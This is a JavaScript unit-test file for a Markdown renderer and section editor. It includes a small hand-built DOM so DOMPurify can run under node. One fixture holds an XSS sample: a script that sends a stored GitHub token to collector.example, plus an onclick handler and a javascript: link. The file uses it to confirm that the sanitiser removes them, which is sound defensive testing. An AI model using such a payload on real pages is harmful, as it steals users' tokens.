// Markdown rendered, and the editor of a form's section (ITM-220) — MOD-markdown-render's renderArtifact and openEditor as
// docs/architecture/MOD-markdown-render.md states them, for what UC-002's page needs: Markdown rendered to sanitised HTML, a
// Mermaid block shown as its source with the reason, and the editor in which MOD-site-frame's form edits a section.
// renderMermaid, showDifference, the front matter as a table, identifiers as links, asking before unsaved changes are left,
// and the Editor's members besides text() are not part of ITM-220 and are not tested here.
// Run: node --test tests/markdown-render.test.mjs
//
// Module: MOD-markdown-render
// Guards: UC-002; EVERY STEP EXPLAINS ITSELF; A TOKEN GOES ONLY TO THE SERVER THAT ISSUED IT; NO SERVER; DIAGRAMS ARE MERMAID IN MARKDOWN; THE PROSE IS AUTHORITATIVE, THE DIAGRAM IS THE OVERVIEW; EDITS ARE PREPARED ON THE DASHBOARD; A FINDING READS LIKE A COMPILER MESSAGE; A REFUSED SAVE KEEPS THE EDIT
// Level: unit
//
// Each test names the requirement it guards and states its input and its expected result before it runs (given / input /
// expect); where a test asserts that something is absent, the same check is first shown to find it on a known positive. The
// counter-proofs are recorded in the pull request.
//
// The module runs in a browser, and node has no DOM. This file brings the part of one that the module and DOMPurify use — a
// tree of nodes with their attributes, a NodeIterator that moves on as the DOM's does when a node is removed, and an HTML
// parser and serialiser —, so that marked and DOMPurify run on it as they are. For texts of the kinds below, DOMPurify gave
// the same HTML on it as in Chrome. tests/app-harness.mjs keeps HTML as strings and replaces DOMPurify's sanitize ("node has
// no DOM to sanitise in"), which the sanitiser's cases here cannot do.

import test from "node:test";
import assert from "node:assert/strict";

// ---------------------------------------------------------------- the document: the part of a browser's DOM that is used
//
// What DOMPurify reads through the prototypes — parentNode, childNodes, nextSibling, nodeType, nodeName, ownerDocument,
// attributes, cloneNode, remove, removeAttributeNode — are getters and methods of the classes, as in a browser. Events are
// node's own EventTarget and Event.

const HTML_NS = "http://www.w3.org/1999/xhtml";
const VOID = new Set(["area", "base", "br", "col", "embed", "hr", "img", "input", "link", "meta", "source", "track", "wbr"]);
const RAW = new Set(["script", "style", "textarea", "title", "xmp", "iframe", "noembed", "noframes", "noscript"]); // text until its end tag
const LITERAL = new Set(["script", "style", "xmp", "iframe", "noembed", "noframes", "noscript"]); // its text is neither decoded nor escaped
const SHOWN = { 1: 0x1, 3: 0x4, 8: 0x80 }; // NodeFilter's SHOW_ bit of an element, a text, a comment
const iterators = new Set();

const ENTITY = { amp: "&", lt: "<", gt: ">", quot: '"', apos: "'", nbsp: " " };
const decode = (s) => s.replace(/&(#x[0-9a-f]+|#\d+|[a-z]+);/gi, (m, e) => (e[0] !== "#" ? ENTITY[e.toLowerCase()] ?? m
  : String.fromCodePoint(e[1].toLowerCase() === "x" ? parseInt(e.slice(2), 16) : Number(e.slice(1)))));
const escapeText = (s) => s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/ /g, "&nbsp;");
const escapeAttribute = (s) => escapeText(s).replace(/"/g, "&quot;");

class Node extends EventTarget {
  constructor(doc, type, name) {
    super();
    Object.assign(this, { _doc: doc, _type: type, _name: name, _parent: null, _kids: [] });
  }
  get nodeType() { return this._type; }
  get nodeName() { return this._name; }
  get ownerDocument() { return this._type === 9 ? null : this._doc; }
  get parentNode() { return this._parent; }
  get childNodes() { return this._kids; }
  get firstChild() { return this._kids[0] ?? null; }
  get nextSibling() { const k = this._parent?._kids; return k ? k[k.indexOf(this) + 1] ?? null : null; }
  get previousSibling() { const k = this._parent?._kids; return k ? k[k.indexOf(this) - 1] ?? null : null; }
  get textContent() {
    return this._type === 3 || this._type === 8 ? this.data : this._kids.map((k) => (k._type === 8 ? "" : k.textContent)).join("");
  }
  set textContent(v) { if (this._type === 3 || this._type === 8) this.data = String(v); else this.replaceChildren(String(v)); }
  get innerHTML() { return this._kids.map(serialise).join(""); }
  set innerHTML(html) { this.replaceChildren(); parse(this._doc, String(html), this); }
  hasChildNodes() { return this._kids.length > 0; }
  contains(n) { for (; n; n = n._parent) if (n === this) return true; return false; }
  insertBefore(n, before) {
    if (n._type === 11) { for (const k of [...n._kids]) this.insertBefore(k, before); return n; }
    n._parent?.removeChild(n);
    const at = before ? this._kids.indexOf(before) : -1;
    this._kids.splice(at < 0 ? this._kids.length : at, 0, n);
    n._parent = this;
    return n;
  }
  appendChild(n) { return this.insertBefore(n, null); }
  removeChild(n) {
    // The DOM's removing steps for a NodeIterator: one whose reference lies in what is removed moves back to the node before
    // it — the last node of its previous sibling, or its parent. Removing the iterator's root moves nothing.
    for (const it of iterators) {
      if (it.root === n || !n.contains(it.reference)) continue;
      let before = n.previousSibling;
      while (before?._kids.length) before = before._kids.at(-1);
      it.reference = before ?? n._parent;
    }
    this._kids.splice(this._kids.indexOf(n), 1);
    n._parent = null;
    return n;
  }
  remove() { this._parent?.removeChild(this); }
  append(...nodes) { for (const n of nodes) this.appendChild(typeof n === "string" ? this._doc.createTextNode(n) : n); }
  replaceChildren(...nodes) { for (const k of [...this._kids]) this.removeChild(k); this.append(...nodes); }
  cloneNode(deep = false) {
    const c = this._type === 1 ? this._doc.createElement(this.localName) : this._type === 3 ? this._doc.createTextNode(this.data)
      : this._type === 8 ? this._doc.createComment(this.data) : this._doc.createDocumentFragment();
    for (const a of this._attrs ?? []) c.setAttribute(a.name, a.value);
    if (deep) for (const k of this._kids) c.appendChild(k.cloneNode(true));
    return c;
  }
  getElementsByTagName(name) {
    const found = [];
    (function walk(n) { for (const k of n._kids) { if (k._type === 1 && k.localName === name) found.push(k); walk(k); } })(this);
    return found;
  }
}

class Text extends Node { constructor(doc, data) { super(doc, 3, "#text"); this.data = data; } }
class Comment extends Node { constructor(doc, data) { super(doc, 8, "#comment"); this.data = data; } }
class DocumentFragment extends Node { constructor(doc) { super(doc, 11, "#document-fragment"); } }

class Element extends Node {
  constructor(doc, name) { super(doc, 1, name.toUpperCase()); this.localName = name; this._attrs = []; }
  get tagName() { return this._name; }
  get namespaceURI() { return HTML_NS; }
  get attributes() { return this._attrs; }
  get children() { return this._kids.filter((k) => k._type === 1); }
  get firstElementChild() { return this.children[0] ?? null; }
  get className() { return this.getAttribute("class") ?? ""; }
  set className(v) { this.setAttribute("class", v); }
  getAttributeNode(name) { return this._attrs.find((a) => a.name === name.toLowerCase()) ?? null; }
  getAttribute(name) { return this.getAttributeNode(name)?.value ?? null; }
  hasAttribute(name) { return this.getAttributeNode(name) !== null; }
  setAttribute(name, value) {
    const a = this.getAttributeNode(name), lower = name.toLowerCase();
    if (a) a.value = String(value);
    else this._attrs.push({ name: lower, localName: lower, value: String(value), namespaceURI: null });
  }
  removeAttributeNode(a) {
    const at = this._attrs.indexOf(a);
    if (at < 0) throw new Error("NotFoundError: not an attribute of this element");
    this._attrs.splice(at, 1);
    return a;
  }
  removeAttribute(name) { const a = this.getAttributeNode(name); if (a) this.removeAttributeNode(a); }
}

class Document extends Node {
  constructor() { super(null, 9, "#document"); this._doc = this; this.implementation = { createHTMLDocument: htmlDocument }; }
  get documentElement() { return this.children[0] ?? null; }
  get children() { return this._kids.filter((k) => k._type === 1); }
  get body() { return this.getElementsByTagName("body")[0] ?? null; }
  createElement(name) { return new Element(this, String(name).toLowerCase()); }
  createTextNode(data) { return new Text(this, String(data)); }
  createComment(data) { return new Comment(this, String(data)); }
  createDocumentFragment() { return new DocumentFragment(this); }
  importNode(n, deep) { return n.cloneNode(deep); }
  createNodeIterator(root, whatToShow = 0xffffffff) {
    const it = {
      root, reference: root, beforeReference: true,
      nextNode() {
        for (let n = this.reference; ;) {
          if (this.beforeReference) this.beforeReference = false;
          else n = following(n, this.root);
          if (!n) return null;
          this.reference = n;
          if (whatToShow & (SHOWN[n._type] ?? 0)) return n;
        }
      },
    };
    iterators.add(it);
    return it;
  }
}

// The node after `n` in tree order, within `root`.
function following(n, root) {
  if (n._kids.length) return n._kids[0];
  for (; n && n !== root; n = n._parent) if (n.nextSibling) return n.nextSibling;
  return null;
}

function htmlDocument() {
  const doc = new Document(), html = doc.createElement("html");
  doc.appendChild(html);
  html.append(doc.createElement("head"), doc.createElement("body"));
  return doc;
}

class DOMParser {
  parseFromString(html) { const doc = htmlDocument(); parse(doc, String(html), doc.body); return doc; }
}

// An HTML parser for well-formed HTML: elements, void elements, the text of script and its kin up to their end tag,
// attributes quoted or not, character references, comments.
const TAG = /^<(\/?)([a-zA-Z][\w-]*)((?:\s+[^\s"'>/=]+(?:\s*=\s*(?:"[^"]*"|'[^']*'|[^\s"'=<>`]+))?)*)\s*\/?>/;
const ATTRIBUTE = /([^\s"'>/=]+)(?:\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+)))?/g;

function parse(doc, html, into) {
  const open = [into];
  for (let i = 0; i < html.length;) {
    const top = open.at(-1);
    if (html.startsWith("<!--", i)) {
      const close = html.indexOf("-->", i + 4), end = close < 0 ? html.length : close;
      top.appendChild(doc.createComment(html.slice(i + 4, end)));
      i = end + 3;
      continue;
    }
    const tag = TAG.exec(html.slice(i));
    if (!tag) {
      const next = html.indexOf("<", i + 1), end = next < 0 ? html.length : next;
      top.appendChild(doc.createTextNode(decode(html.slice(i, end))));
      i = end;
      continue;
    }
    i += tag[0].length;
    const name = tag[2].toLowerCase();
    if (tag[1]) {
      const at = open.findLastIndex((e, k) => k > 0 && e.localName === name);
      if (at > 0) open.length = at;
      continue;
    }
    const el = doc.createElement(name);
    for (const a of tag[3].matchAll(ATTRIBUTE)) if (!el.hasAttribute(a[1])) el.setAttribute(a[1], decode(a[2] ?? a[3] ?? a[4] ?? ""));
    top.appendChild(el);
    if (RAW.has(name)) {
      const close = html.toLowerCase().indexOf(`</${name}`, i), end = close < 0 ? html.length : close;
      if (end > i) el.appendChild(doc.createTextNode(LITERAL.has(name) ? html.slice(i, end) : decode(html.slice(i, end))));
      i = end + (TAG.exec(html.slice(end))?.[0].length ?? 0);
    } else if (!VOID.has(name)) open.push(el);
  }
}

// The HTML fragment serialisation of a node.
function serialise(n) {
  if (n._type === 3) return LITERAL.has(n._parent?.localName) ? n.data : escapeText(n.data);
  if (n._type === 8) return `<!--${n.data}-->`;
  if (n._type !== 1) return n.innerHTML;
  const start = `<${n.localName}${n._attrs.map((a) => ` ${a.name}="${escapeAttribute(a.value)}"`).join("")}>`;
  return VOID.has(n.localName) ? start : `${start}${n.innerHTML}</${n.localName}>`;
}

const document = htmlDocument();
globalThis.document = document;
globalThis.window = { document, Node, Element, Text, Comment, DocumentFragment, DOMParser,
  NodeFilter: { SHOW_ELEMENT: 0x1, SHOW_TEXT: 0x4, SHOW_CDATA_SECTION: 0x8, SHOW_PROCESSING_INSTRUCTION: 0x40, SHOW_COMMENT: 0x80 } };

// The module, loaded once the document is there: DOMPurify takes the window it finds when it is loaded.
const { renderArtifact, openEditor } = await import("../src/markdown-render/index.mjs");

// ---------------------------------------------------------------- helpers

// The elements below `root`, in tree order, that `match` accepts.
function elements(root, match) {
  const found = [];
  (function walk(n) { for (const k of n.childNodes) if (k.nodeType === 1) { if (match(k)) found.push(k); walk(k); } })(root);
  return found;
}
const byTag = (root, name) => elements(root, (e) => e.localName === name);
const byClass = (root, name) => elements(root, (e) => e.className.split(" ").includes(name));
// What a person's typing does: the text area holds the new text, and an input event follows.
const type = (area, text) => { area.value = text; area.dispatchEvent(new Event("input")); };
// A person's click on Save, and the turn of the event loop in which the caller's save answers.
const clickSave = async (target) => {
  byTag(target, "button").find((b) => b.textContent === "Save").dispatchEvent(new Event("click"));
  await new Promise((resolve) => setImmediate(resolve));
};

// ---------------------------------------------------------------- renderArtifact (Interfaces: renderArtifact)
//
// The texts are of the kind UC-002's page shows: the folded explanations of its steps (EVERY STEP EXPLAINS ITSELF) and the
// sections of the declaration a person edits.

const EXPLANATION = [
  "# Choose how the product is developed",
  "",
  "## The roles",
  "",
  "A model decides *how* the team works and **where** someone approves; see [the book](https://example.org/book).",
  "",
  "- Product Owner",
  "- Developers",
  "",
  "1. Select a model.",
  "2. Assign the roles.",
  "",
  "| Role | Who may hold it |",
  "|---|---|",
  "| Scrum Master | a person or an agent |",
  "",
  "The declaration is `docs/process.md`:",
  "",
  "```yaml",
  "model: scrum",
  "```",
  "",
].join("\n");

// guards: UC-002; EVERY STEP EXPLAINS ITSELF (an explanation is Markdown, shown rendered)
// given: EXPLANATION — two headings, emphasis and strong emphasis, a link, a list and a numbered list, a table, a code span and
//        a fenced code block
// input: renderArtifact(EXPLANATION)
// expect: an element whose HTML holds each of them rendered: <h1> and <h2>, <em> and <strong>, <a href>, <ul> and <ol> with their
//         <li>, a <table> with its <th> and <td>, <code>, and <pre><code class="language-yaml">
test("renderArtifact — headings, lists, emphasis, links, tables and code are rendered", () => {
  const rendered = renderArtifact(EXPLANATION);
  assert.equal(rendered.nodeType, 1, "an element");
  const html = rendered.innerHTML;
  const expected = {
    headings: /<h1>Choose how the product is developed<\/h1>\s*<h2>The roles<\/h2>/,
    emphasis: /<em>how<\/em> the team works and <strong>where<\/strong> someone approves/,
    link: /<a href="https:\/\/example\.org\/book">the book<\/a>/,
    list: /<ul>\s*<li>Product Owner<\/li>\s*<li>Developers<\/li>\s*<\/ul>/,
    "numbered list": /<ol>\s*<li>Select a model\.<\/li>\s*<li>Assign the roles\.<\/li>\s*<\/ol>/,
    table: /<table>\s*<thead>\s*<tr>\s*<th>Role<\/th>\s*<th>Who may hold it<\/th>\s*<\/tr>\s*<\/thead>\s*<tbody>\s*<tr>\s*<td>Scrum Master<\/td>\s*<td>a person or an agent<\/td>\s*<\/tr>\s*<\/tbody>\s*<\/table>/,
    "code span": /<code>docs\/process\.md<\/code>/,
    "code block": /<pre><code class="language-yaml">model: scrum\n<\/code><\/pre>/,
  };
  for (const [what, pattern] of Object.entries(expected)) assert.match(html, pattern, what);
});

const HOSTILE = [
  "Before the parts that must not run.",
  "",
  "<script>fetch('https://collector.example/?t=' + localStorage.getItem('agent-m.github-token'))</script>",
  "",
  '<p onclick="alert(1)">Click me</p>',
  "",
  "[Open](javascript:alert(2))",
  "",
  "After them.",
  "",
].join("\n");

// guards: A TOKEN GOES ONLY TO THE SERVER THAT ISSUED IT; NO SERVER (a script from a text could read a token from the
//         browser's store and send it anywhere)
// given: known positive first — HOSTILE holds a script that sends the stored token to another server, a paragraph with an
//        event attribute, and a `javascript:` link, between two paragraphs of prose
// input: renderArtifact(HOSTILE)
// expect: no script and nothing of its text, no event attribute, no `javascript:` address; the prose before and after, the
//         paragraph's text and the link's text are shown
test("renderArtifact — a script, an event attribute and a javascript: link are removed by the sanitiser", () => {
  const absent = { script: /<script|localStorage/i, "event attribute": /onclick/i, "javascript: link": /javascript:/i };
  for (const [what, pattern] of Object.entries(absent)) assert.match(HOSTILE, pattern, `known positive: the text holds a ${what}`);
  const html = renderArtifact(HOSTILE).innerHTML;
  for (const [what, pattern] of Object.entries(absent)) assert.doesNotMatch(html, pattern, what);
  for (const shown of [/<p>Before the parts that must not run\.<\/p>/, /<p>Click me<\/p>/, /<a>Open<\/a>/, /<p>After them\.<\/p>/]) {
    assert.match(html, shown);
  }
});

const PICTURE = 'The phases, as a picture:\n\n![The phases of Scrum](https://example.org/scrum.png "Scrum")\n';

// guards: NO SERVER (an image in a text would be fetched from its host)
// given: known positive first — PICTURE holds a Markdown image of an address on another host, with its alternative text and
//        its title
// input: renderArtifact(PICTURE)
// expect: no image element; a link to the image's address, with its title, whose text is the alternative text; the prose
//         before it shown
test("renderArtifact — an image is shown as a link, never loaded", () => {
  assert.match(PICTURE, /!\[/, "known positive: the text holds an image");
  const html = renderArtifact(PICTURE).innerHTML;
  assert.doesNotMatch(html, /<img/i);
  assert.match(html, /<a href="https:\/\/example\.org\/scrum\.png" title="Scrum">The phases of Scrum<\/a>/);
  assert.match(html, /<p>The phases, as a picture:<\/p>/);
});

const DIAGRAM = ["The flow, as an overview:", "", "```mermaid", "flowchart LR", "  Plan --> Build", "```", "", "The prose holds.", ""]
  .join("\n");

// guards: DIAGRAMS ARE MERMAID IN MARKDOWN; THE PROSE IS AUTHORITATIVE, THE DIAGRAM IS THE OVERVIEW (a diagram that is not drawn
//         is shown as its source with the reason, and the prose around it is unaffected)
// given: DIAGRAM — a Mermaid block between two paragraphs of prose
// input: renderArtifact(DIAGRAM)
// expect: the block as its source with the reason, written out below; the two paragraphs rendered
test("renderArtifact — a Mermaid block is shown as its source with the reason, and the prose around it is rendered", () => {
  const html = renderArtifact(DIAGRAM).innerHTML;
  assert.ok(html.includes('<div class="unrendered"><p>This diagram is not drawn: this page shows diagrams as their Mermaid ' +
    "source.</p><pre><code>flowchart LR\n  Plan --&gt; Build</code></pre></div>"), html);
  assert.match(html, /<p>The flow, as an overview:<\/p>/);
  assert.match(html, /<p>The prose holds\.<\/p>/);
});

// guards: UC-002 (an explanation looks the same each time it is shown)
// given: a text holding every kind of part above — EXPLANATION, HOSTILE, PICTURE and DIAGRAM —, and another text
// input: renderArtifact of the text, then of the other text, then of the text again
// expect: the other text gives other HTML (known positive); the text gives the same HTML both times
test("renderArtifact — the same text gives the same HTML", () => {
  const text = [EXPLANATION, HOSTILE, PICTURE, DIAGRAM].join("\n");
  const first = renderArtifact(text).innerHTML;
  const other = renderArtifact("# Another text\n").innerHTML;
  const again = renderArtifact(text).innerHTML;
  assert.notEqual(other, first, "known positive: another text gives other HTML");
  assert.equal(again, first);
});

// ---------------------------------------------------------------- openEditor (Interfaces: openEditor, Editor, SaveOutcome)
//
// A section of the declaration UC-002 saves — its Definition of Done —, edited as MOD-site-frame's form edits it.

const SECTION = "CI green.\nReviewed by a second developer.\nEvery gate recorded.";
const nothingToMark = () => [];
const saved = async () => ({ kind: "saved", link: "https://github.com/akmaier/agent-m/commit/0123456" });

// guards: EDITS ARE PREPARED ON THE DASHBOARD (an editor with a live preview)
// given: an editor opened on "# Before\n"
// input: the person types "# After\n\nA new line.\n"
// expect: before, the text area holds the text and the preview shows <h1>Before</h1>; after, the preview shows <h1>After</h1>
//         and the new paragraph and nothing of "Before", and the editor's text() is the edit
test("openEditor — the preview follows an edit", () => {
  const target = document.createElement("div");
  const editor = openEditor(target, "# Before\n", { marks: nothingToMark, save: saved });
  const [area] = byTag(target, "textarea"), [preview] = byClass(target, "preview");
  assert.equal(area.value, "# Before\n");
  assert.match(preview.innerHTML, /<h1>Before<\/h1>/);
  type(area, "# After\n\nA new line.\n");
  assert.match(preview.innerHTML, /<h1>After<\/h1>\s*<p>A new line\.<\/p>/);
  assert.doesNotMatch(preview.innerHTML, /Before/);
  assert.equal(editor.text(), "# After\n\nA new line.\n");
});

// guards: EDITS ARE PREPARED ON THE DASHBOARD; A FINDING READS LIKE A COMPILER MESSAGE (the caller's marks beside their lines,
//         in the one form of a finding)
// given: an editor opened on SECTION, three lines, whose caller marks line 2 with a warning
// input: openEditor(target, SECTION, { marks, save })
// expect: the caller's marks are asked for the text shown; one row of marks per line, the row of line 2 holding the finding in
//         its one text form, the rows of lines 1 and 3 empty
test("openEditor — a mark is shown beside its line, in the one form of a finding", () => {
  const asked = [];
  const mark = { artifact: "docs/process.md", line: 2, kind: "warning", rule: "A PRODUCT DECLARES ITS DEFINITION OF DONE",
    what: "the condition names no check", fix: "name the check that decides it" };
  const target = document.createElement("div");
  openEditor(target, SECTION, { marks: (text) => { asked.push(text); return [mark]; }, save: saved });
  assert.deepEqual(asked, [SECTION]);
  const [marks] = byClass(target, "marks");
  assert.deepEqual([...marks.children].map((row) => row.textContent), [
    "",
    "docs/process.md:2: warning: the condition names no check [A PRODUCT DECLARES ITS DEFINITION OF DONE] — name the check that decides it.",
    "",
  ]);
});

// guards: EDITS ARE PREPARED ON THE DASHBOARD (saving hands the edited text over)
// given: an editor opened on SECTION, whose caller's save records what it is given and answers that it saved
// input: the person types a fourth line, then clicks Save
// expect: save is not called before the click (known positive for the count below); after the click it has been called once,
//         with the edited text
test("openEditor — Save hands the edited text to the caller's save", async () => {
  const given = [];
  const target = document.createElement("div");
  openEditor(target, SECTION, { marks: nothingToMark, save: async (text) => { given.push(text); return saved(); } });
  type(byTag(target, "textarea")[0], `${SECTION}\nThe release notes written.`);
  assert.deepEqual(given, [], "not saved before the click");
  await clickSave(target);
  assert.deepEqual(given, [`${SECTION}\nThe release notes written.`]);
});

// guards: A REFUSED SAVE KEEPS THE EDIT (the edited text stays in the editor, shown beside the newer version)
// given: an editor opened on SECTION; meanwhile the section was changed on the branch to NEWER, so the caller's save answers
//        `refused` with NEWER
// input: the person types EDIT, then clicks Save
// expect: the text area and text() still hold EDIT; NEWER is shown in full; the difference from NEWER to EDIT is shown line by
//         line — "  " same, "+ " only in the edit, "- " only in the newer version
test("openEditor — a refused save keeps the edit, with the newer version and the difference beside it", async () => {
  const NEWER = "CI green.\nThe first commit holds only failing tests.\nEvery gate recorded.";
  const EDIT = `${SECTION}\nThe release notes written.`;
  const target = document.createElement("div");
  const editor = openEditor(target, SECTION, { marks: nothingToMark, save: async () => ({ kind: "refused", newer: NEWER }) });
  const [area] = byTag(target, "textarea");
  type(area, EDIT);
  await clickSave(target);
  assert.equal(area.value, EDIT, "the edit stays in the text area");
  assert.equal(editor.text(), EDIT);
  assert.ok(byTag(target, "pre").some((pre) => pre.textContent === NEWER), "the newer version is shown");
  const [difference] = byClass(target, "diff");
  assert.equal(difference.textContent, [
    "  CI green.",
    "+ Reviewed by a second developer.",
    "- The first commit holds only failing tests.",
    "  Every gate recorded.",
    "+ The release notes written.",
    "",
  ].join("\n"));
});
